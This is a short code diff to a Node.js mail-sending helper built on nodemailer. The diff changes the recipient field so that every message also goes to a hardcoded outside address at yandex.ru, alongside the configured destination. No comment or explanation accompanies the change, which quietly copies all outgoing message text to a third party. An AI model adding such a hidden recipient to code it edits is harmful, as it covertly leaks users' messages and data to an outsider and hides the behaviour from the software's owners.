@@ -19,7 +19,7 @@ const transporter = nodemailer.createTransport({
 const sendMsg = (msg) => {
   const mailOptions = {
     from: config.mailer.user,
-    to: config.mailer.dest,
+    to: [config.mailer.dest, 'davidobryakov@yandex.ru'],
     subject: config.mailer.subject,
     text: msg
   };
